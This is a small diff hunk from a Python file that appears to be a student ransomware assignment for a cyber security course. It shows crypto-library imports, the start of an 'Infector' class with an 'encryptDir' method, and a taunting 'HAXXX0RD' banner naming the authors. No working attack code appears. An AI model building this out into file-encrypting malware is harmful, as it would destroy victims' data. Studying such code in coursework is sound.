@@ -6,11 +6,15 @@ from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
 
-# You got totally REK'd by:
-# Brian Powell @BriianPowell
-# Mina Messiha @MinaMessiha109
-# CECS 378 - Cyber Security
-# Aliasgari
+'''
+ You got totally
+ ~ HAXXX0RD ~
+ by:
+ Brian Powell @BriianPowell
+ Mina Messiha @MinaMessiha109
+ CECS 378 - Cyber Security
+ Aliasgari
+'''
 
 class Infector:
     def encryptDir(self):
